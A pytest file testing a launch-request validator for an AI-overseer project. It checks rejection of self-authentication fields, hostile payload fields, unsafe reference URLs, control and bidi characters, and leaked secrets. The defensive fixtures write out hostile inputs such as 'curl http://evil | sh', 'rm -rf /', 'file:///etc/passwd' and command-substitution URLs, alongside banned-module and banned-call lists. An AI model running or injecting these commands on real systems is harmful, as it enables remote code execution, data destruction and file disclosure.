#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tests for FoundUp LaunchRequest -- public input cannot self-authenticate or become code."""

from __future__ import annotations

import ast
import json
from pathlib import Path

import pytest

from modules.ai_intelligence.ai_overseer.src.foundup_genesis.launch_request import (
    LaunchRequest,
    LaunchRequestError,
    LaunchRequestIntakeContext,
    to_genesis_envelope,
    validate_launch_request,
)
from modules.ai_intelligence.ai_overseer.src.foundup_genesis.envelope import LifecycleStage
from modules.ai_intelligence.ai_overseer.src.foundup_genesis.validator import (
    validate_genesis_envelope,
)

MODULE_SRC = (
    Path(__file__).resolve().parents[1] / "src" / "foundup_genesis" / "launch_request.py"
)


def _clean_payload() -> LaunchRequest:
    return LaunchRequest(
        proposed_name="Get Kei Truck Marketplace",
        problem_statement="Help people buy and sell used Kei trucks safely.",
        intended_users="scouts, buyers, sellers",
        category="marketplace",
        reference_urls=["https://example.com/kei-trucks"],
        requested_type="marketplace",
    )


def _authed() -> LaunchRequestIntakeContext:
    return LaunchRequestIntakeContext(authenticated=True, requester_handle="alice")


# --- positive ---------------------------------------------------------------

def test_clean_authenticated_validates():
    assert validate_launch_request(_clean_payload(), _authed()).ok


def test_clean_invite_verified_validates():
    ctx = LaunchRequestIntakeContext(invite_token_verified=True, requester_handle="bob")
    assert validate_launch_request(_clean_payload(), ctx).ok


def test_maps_to_genesis_valid_envelope():
    env = to_genesis_envelope(_clean_payload(), _authed())
    res = validate_genesis_envelope(env, strict_mode=False)
    assert res.is_valid, res.errors


# --- intake gate (Addendum C: context only) ---------------------------------

def test_intake_gate_rejects_unauthenticated():
    res = validate_launch_request(_clean_payload(), LaunchRequestIntakeContext())
    assert not res.ok
    assert any("intake gated" in e for e in res.errors)


def test_unauthenticated_mapping_raises():
    with pytest.raises(LaunchRequestError):
        to_genesis_envelope(_clean_payload(), LaunchRequestIntakeContext())


# --- self-authentication rejection (the load-bearing fix) -------------------

@pytest.mark.parametrize("bad", [
    {"authenticated": True},
    {"invite_token_present": True},
    {"invite_token_verified": True},
    {"auth": {"passed": True}},
    {"role": "admin"},
    {"is_admin": True},
    {"authorized": True},
    {"authEnticated": True},          # case/camel evasion
    {"invite-token-verified": True},  # separator evasion
])
def test_payload_cannot_self_authenticate(bad):
    payload = {"proposed_name": "X", "category": "marketplace"}
    payload.update(bad)
    # Even with a passing context, a self-auth field in the PAYLOAD is rejected.
    res = validate_launch_request(payload, _authed())
    assert not res.ok, f"self-auth field not rejected: {bad}"


# --- hostile input rejected -------------------------------------------------

@pytest.mark.parametrize("bad", [
    {"exec": "curl http://evil | sh"},
    {"command": "rm -rf /"},
    {"external_repo_requested": True},
    {"create_repo": True},
    {"source_authority": "external_proto"},
    {"lifecycle_stage": "mvp"},
    {"merge_approved": True},
    {"gate_passed": True},
    {"api_key": "sk-ABCDEFGHIJKLMNOP1234"},
    {"externalRepoRequested": True},   # camel evasion
])
def test_hostile_payload_fields_rejected(bad):
    payload = {"proposed_name": "X", "category": "marketplace"}
    payload.update(bad)
    assert not validate_launch_request(payload, _authed()).ok, f"hostile field not rejected: {bad}"


# --- reference_urls hygiene -------------------------------------------------

@pytest.mark.parametrize("bad_url", [
    "file:///etc/passwd",
    "/etc/passwd",
    "modules/foundups/getk",
    "https://x.com/$(whoami)",
    "javascript:alert(1)",
    "https://x.com/a; rm -rf /",
])
def test_bad_reference_urls_rejected(bad_url):
    payload = LaunchRequest(proposed_name="X", category="marketplace", reference_urls=[bad_url])
    assert not validate_launch_request(payload, _authed()).ok, f"bad url not rejected: {bad_url!r}"


def test_clean_public_urls_pass():
    payload = LaunchRequest(
        proposed_name="X", category="marketplace",
        reference_urls=["https://example.com/a", "http://example.org/b"],
    )
    assert validate_launch_request(payload, _authed()).ok


# --- mapping invariants -----------------------------------------------------

def test_mapping_forces_no_external_repo_and_idea_stage():
    env = to_genesis_envelope(_clean_payload(), _authed())
    assert env.external_repo_requested is False
    assert env.lifecycle_stage in (LifecycleStage.IDEA, LifecycleStage.INCUBATING)
    assert "source_authority" not in env.to_dict()


def test_requester_handle_from_context_not_payload():
    # A payload-supplied requester_handle must NOT become the trusted requested_by.
    payload = LaunchRequest(proposed_name="X", category="marketplace", requester_handle="attacker")
    env = to_genesis_envelope(payload, LaunchRequestIntakeContext(authenticated=True, requester_handle="alice"))
    assert env.requested_by == "alice"
    assert env.requested_by != "attacker"


def test_mapping_without_context_handle_uses_public_intake():
    env = to_genesis_envelope(LaunchRequest(proposed_name="X", category="marketplace"),
                              LaunchRequestIntakeContext(authenticated=True))
    assert env.requested_by == "public_intake"


# --- redaction --------------------------------------------------------------

def test_secret_in_problem_statement_redacted():
    payload = LaunchRequest(
        proposed_name="X", category="marketplace",
        problem_statement="our key is sk-ABCDEFGHIJKLMNOP1234 do not leak",
    )
    blob = json.dumps(payload.to_dict())
    assert "sk-ABCDEFGHIJKLMNOP1234" not in blob
    assert "[REDACTED]" in blob


def test_raw_dict_secret_redacted_at_envelope_sink():
    # SENTINEL finding: a RAW dict (never through LaunchRequest.to_dict) must NOT
    # leak a secret from problem_statement into the envelope description/tagline/name.
    payload = {
        "proposed_name": "Mall sk-NAMEKEY1234567890 X",
        "category": "marketplace",
        "problem_statement": "our key is sk-ABCDEFGHIJKLMNOP1234 do not leak",
    }
    env = to_genesis_envelope(payload, _authed())
    blob = json.dumps(env.to_dict())
    assert "sk-ABCDEFGHIJKLMNOP1234" not in blob, "raw-dict problem_statement secret leaked"
    assert "sk-NAMEKEY1234567890" not in blob, "raw-dict proposed_name secret leaked"


# --- GetK walkthrough -------------------------------------------------------

def test_getk_walkthrough_maps_to_valid_envelope():
    payload = LaunchRequest(
        proposed_name="Get Kei Truck Marketplace",
        problem_statement="AI-managed marketplace for used Kei trucks; reusable for any used item.",
        intended_users="scouts, buyers, sellers",
        category="marketplace",
        requested_type="marketplace",
    )
    env = to_genesis_envelope(payload, _authed())
    assert env.foundup_id.startswith("get_kei_truck")
    assert env.external_repo_requested is False
    assert validate_genesis_envelope(env, strict_mode=False).is_valid


# --- AST: no runtime / network / subprocess / file-write --------------------

def _module_ast():
    return ast.parse(MODULE_SRC.read_text(encoding="utf-8"))


def test_module_imports_no_runtime_or_network():
    tree = _module_ast()
    mods = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for a in node.names:
                mods.add(a.name)
        elif isinstance(node, ast.ImportFrom):
            if node.module:
                mods.add(node.module)
    banned_roots = {"subprocess", "socket", "ssl", "urllib", "requests", "httpx",
                    "http", "ctypes", "importlib", "multiprocessing", "os", "sys",
                    "shutil", "pickle", "marshal", "pathlib"}
    bad_root = {m for m in mods if m.split(".")[0] in banned_roots}
    assert not bad_root, f"banned module import: {bad_root}"
    # Forbid Hermes/Kanban/OpenClaw RUNTIME -- but the pure #807 contract
    # kanban_plugin_contract (a WRE-side type module) is the SANCTIONED reuse.
    runtime_markers = ("hermes", "openclaw", "foundup_job_consumer", "wre_core",
                       "foundup_job_executor")
    bad_runtime = {m for m in mods if any(k in m for k in runtime_markers)}
    assert not bad_runtime, f"runtime import: {bad_runtime}"
    assert any("kanban_plugin_contract" in m for m in mods), "must reuse #807 contract (import, not copy)"


def test_module_makes_no_exec_process_network_or_write_calls():
    tree = _module_ast()
    banned_names = {"open", "eval", "exec", "compile", "__import__", "input"}
    banned_attrs = {"system", "popen", "Popen", "run", "call", "check_call",
                    "check_output", "write", "write_text", "write_bytes",
                    "urlopen", "connect", "spawn", "fork", "remove", "unlink"}
    name_bad, attr_bad = [], []
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            f = node.func
            if isinstance(f, ast.Name) and f.id in banned_names:
                name_bad.append(f.id)
            elif isinstance(f, ast.Attribute) and f.attr in banned_attrs:
                attr_bad.append(f.attr)
    assert not name_bad, f"banned builtin calls: {name_bad}"
    assert not attr_bad, f"banned attr calls: {attr_bad}"


def test_no_kanban_publish_or_card_symbols():
    src = MODULE_SRC.read_text(encoding="utf-8").lower()
    for forbidden in ("cardspec", "kanban_publish", "publish_card", "kanban_create",
                      "worker_spawn", "drain_", "get_job_queue"):
        assert forbidden not in src, f"launch request must not publish to Kanban: {forbidden}"


# ===========================================================================
# #823 -- CONTROL / FORMAT CHARACTER REJECTION IN PUBLIC DISPLAY FIELDS
#
# A control char (e.g. U+0000) in a display field was ACCEPTED by the Phase-1
# validators and silently SANITIZED into a normal name at envelope construction
# (via _normalize NFKC + redact), producing a draft FoundUp with a laundered
# display name. The fix REJECTS the value at validation time, on the RAW value,
# BEFORE any envelope is constructed. Reject -- do NOT sanitize/strip/coerce.
#
# ARCHITECT-pinned policy (Addendum A): reject ALL Unicode category Cc, plus the
# dangerous Cf subset (zero-width 200B/200C/200D/FEFF/2060; bidi/isolates
# 202A-202E, 2066-2069). description is NOT exempt -- newline is a Cc char.
#
# ALL control/format/Unicode fixtures are built from CODEPOINTS via chr() or
# \uXXXX escapes so this SOURCE FILE stays pure ASCII (byte-check clean).
# ===========================================================================

# Representative Unicode category Cc sweep (C0 + DEL + C1) -- codepoints only.
_CC_SWEEP_CODEPOINTS = {
    "NUL_0x00": 0x00,
    "TAB_0x09": 0x09,
    "LF_0x0A": 0x0A,
    "CR_0x0D": 0x0D,
    "ESC_0x1B": 0x1B,
    "DEL_0x7F": 0x7F,
    "NEL_0x85": 0x85,   # C1
    "APC_0x9F": 0x9F,   # C1
}

# The ARCHITECT-pinned dangerous Cf subset -- codepoints only.
_CF_PINNED_CODEPOINTS = {
    "ZWSP_200B": 0x200B,
    "ZWNJ_200C": 0x200C,
    "ZWJ_200D": 0x200D,
    "BOM_FEFF": 0xFEFF,
    "WJ_2060": 0x2060,
    "LRE_202A": 0x202A,
    "RLE_202B": 0x202B,
    "PDF_202C": 0x202C,
    "LRO_202D": 0x202D,
    "RLO_202E": 0x202E,
    "LRI_2066": 0x2066,
    "RLI_2067": 0x2067,
    "FSI_2068": 0x2068,
    "PDI_2069": 0x2069,
}

# The four DISPLAY fields in scope for validate_launch_request.
_LR_DISPLAY_FIELDS = ["proposed_name", "problem_statement", "intended_users", "requested_type"]

# Negative controls that MUST still be ACCEPTED (Addendum E: do NOT over-broaden;
# this is NOT an ASCII-only rule). Unicode letters are built from chr(codepoint) so
# this SOURCE stays pure ASCII (a formatter cannot collapse chr() into a literal char).
_NEGATIVE_DISPLAY_VALUES = [
    "Caf" + chr(0x00E9) + " " + chr(0x00C9) + "tude",   # accented Latin: e-acute + E-acute
    chr(0x672A) + chr(0x6765) + " FoundUp",             # CJK "future" (mirai) + FoundUp
    "O'Hara-Smith (test)",                              # ordinary ASCII punctuation
]


def _payload_with(field, value):
    """A clean proposal dict with one display field overridden (raw, un-redacted)."""
    base = {"proposed_name": "Clean Name", "category": "marketplace"}
    base[field] = value
    return base


@pytest.mark.parametrize("char_name,cp", sorted(_CC_SWEEP_CODEPOINTS.items()))
@pytest.mark.parametrize("field", _LR_DISPLAY_FIELDS)
def test_cc_control_char_rejected_per_display_field(field, char_name, cp):
    payload = _payload_with(field, "Good" + chr(cp) + "Name")
    res = validate_launch_request(payload, _authed())
    assert not res.ok, f"{field} with {char_name} not rejected"
    assert any(f"{field} contains disallowed control/format character" in e for e in res.errors)


@pytest.mark.parametrize("char_name,cp", sorted(_CF_PINNED_CODEPOINTS.items()))
@pytest.mark.parametrize("field", _LR_DISPLAY_FIELDS)
def test_cf_format_char_rejected_per_display_field(field, char_name, cp):
    payload = _payload_with(field, "Good" + chr(cp) + "Name")
    res = validate_launch_request(payload, _authed())
    assert not res.ok, f"{field} with {char_name} not rejected"
    assert any(f"{field} contains disallowed control/format character" in e for e in res.errors)


def test_control_char_rejected_on_launchrequest_dataclass_raw_value():
    # The dataclass path reads the RAW attribute (NOT to_dict(), which redacts),
    # so detection sees the original codepoint before any normalization.
    payload = LaunchRequest(proposed_name="Good" + chr(0x00) + "Name", category="marketplace")
    res = validate_launch_request(payload, _authed())
    assert not res.ok
    assert any("proposed_name contains disallowed control/format character" in e for e in res.errors)


def test_newline_rejected_in_problem_statement_phase1():
    # description-class free text is NOT exempt: a newline (LF, Cc) is rejected this phase.
    payload = _payload_with("problem_statement", "line one" + chr(0x0A) + "line two")
    res = validate_launch_request(payload, _authed())
    assert not res.ok
    assert any("problem_statement contains disallowed control/format character" in e for e in res.errors)


@pytest.mark.parametrize("field", _LR_DISPLAY_FIELDS)
@pytest.mark.parametrize("bad_value", [123, True, {"k": "v"}, ["x"], 4.5])
def test_non_string_display_field_rejected(field, bad_value):
    payload = _payload_with(field, bad_value)
    res = validate_launch_request(payload, _authed())
    assert not res.ok, f"{field}={bad_value!r} (non-string) not rejected"
    assert any(f"{field} must be a string" in e for e in res.errors)


@pytest.mark.parametrize("field", ["problem_statement", "intended_users", "requested_type"])
def test_optional_display_field_absent_is_preserved(field):
    # An optional display field absent from a raw dict (None) is allowed -- no false reject.
    payload = {"proposed_name": "Clean Name", "category": "marketplace"}
    payload.pop(field, None)
    assert validate_launch_request(payload, _authed()).ok, f"absent optional {field} wrongly rejected"


@pytest.mark.parametrize("field", _LR_DISPLAY_FIELDS)
@pytest.mark.parametrize("value", _NEGATIVE_DISPLAY_VALUES)
def test_unicode_letters_not_false_positive_rejected(field, value):
    # Accented Latin / CJK / ordinary punctuation are real letters/marks, NOT Cc/Cf.
    # They MUST still be accepted (this is not an ASCII-only rule).
    payload = _payload_with(field, value)
    assert validate_launch_request(payload, _authed()).ok, f"{field}={value!r} wrongly rejected"


def test_plain_space_in_display_field_accepted():
    # A plain ASCII space (category Zs) is a valid display char, never rejected.
    payload = _payload_with("proposed_name", "Good Name With Spaces")
    assert validate_launch_request(payload, _authed()).ok


def test_reject_error_never_echoes_raw_control_char():
    # SAFE error policy: the error names the field + policy class, never the raw value,
    # repr(value), the offending char, or raw bytes. Use RLO (U+202E) as the offender.
    offender = chr(0x202E)
    payload = _payload_with("proposed_name", "Good" + offender + "Name")
    res = validate_launch_request(payload, _authed())
    assert not res.ok
    for e in res.errors:
        assert offender not in e
        assert "Good" not in e  # the raw value is not echoed at all
        assert repr("Good" + offender + "Name") not in e


def test_control_char_rejected_before_envelope_construction():
    # ADDENDUM D: proposed_name with a control char (the architect note renders it as a
    # space inside "Good Name"; encoded here as an embedded NUL U+0000) -- the OLD path
    # laundered it into a draft; the NEW path rejects BEFORE to_genesis_envelope. We prove
    # the envelope is never constructed: to_genesis_envelope raises LaunchRequestError and
    # produces no envelope dict.
    payload = LaunchRequest(proposed_name="Good" + chr(0x00) + "Name", category="marketplace")
    with pytest.raises(LaunchRequestError) as exc:
        to_genesis_envelope(payload, _authed())
    # The raise carries the SAFE error, never the raw control byte.
    assert chr(0x00) not in str(exc.value)
    assert "contains disallowed control/format character" in str(exc.value)


def test_control_char_envelope_construction_not_reached_spy():
    # ADDENDUM D (construction-not-reached, spied): monkeypatch the envelope constructor
    # in the launch_request module; a control-char name must reject BEFORE it is called.
    import modules.ai_intelligence.ai_overseer.src.foundup_genesis.launch_request as lr

    calls = {"n": 0}
    real_ctor = lr.FoundUpGenesisEnvelope

    def _spy_ctor(*a, **k):
        calls["n"] += 1
        return real_ctor(*a, **k)

    lr.FoundUpGenesisEnvelope = _spy_ctor
    try:
        with pytest.raises(LaunchRequestError):
            lr.to_genesis_envelope(
                LaunchRequest(proposed_name="Good" + chr(0x00) + "Name", category="marketplace"),
                _authed(),
            )
    finally:
        lr.FoundUpGenesisEnvelope = real_ctor
    assert calls["n"] == 0, "envelope constructor was reached for a rejected display field"
